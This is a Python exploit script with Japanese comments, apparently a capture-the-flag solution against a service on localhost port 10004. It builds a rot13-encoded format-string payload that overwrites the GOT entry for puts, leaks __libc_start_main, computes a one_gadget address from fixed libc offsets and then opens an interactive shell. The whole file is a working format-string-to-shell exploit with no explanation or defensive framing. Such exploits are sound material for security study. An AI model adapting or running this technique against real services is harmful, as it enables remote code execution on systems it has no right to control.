import socket, telnetlib, time, struct, codecs


# valueをGOTのputsに書き込む文字列作成
def build_payload(value):
    # 書式文字列
    s = '%43$016lx'
    # 先頭はsに固定
    n = 16

    for i in range(6):
        # 追加で出力する文字数
        t = (value & 0xff) - n % 256
        if t <= 1:
            t += 256
        s += '%{}c%{}$hhn'.format(t, 24 + i)
        value >>= 8
        n += t
    
    s += '\0' * (128 - len(s))
    s = bytes(s, 'ascii')
    for i in range(6):
        s += struct.pack('<Q', 0x601018+i)

    # rot13
    s = s.decode('latin-1')
    s = codecs.decode(s, 'rot13')
    s = s.encode('latin-1')
    return s


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 10004))

    # format string attack to rop to main
    main_start_addr = 0x4007a2
    s.sendall(build_payload(main_start_addr) + b'\n')

    time.sleep(1)
    d = s.recv(9999)
    start_main = int(d[:16], 16)
    print('__libc_start_main: ', hex(start_main))
    libc_start_main = 0x21b97
    one_gadget_rce = 0x10a38c
    rce = (start_main - libc_start_main + one_gadget_rce)

    s.sendall(build_payload(rce) + b'\n')

    time.sleep(1)
    s.recv(9999)

    t = telnetlib.Telnet()

    t.sock = s
    t.interact()


if __name__ == '__main__':
    main()
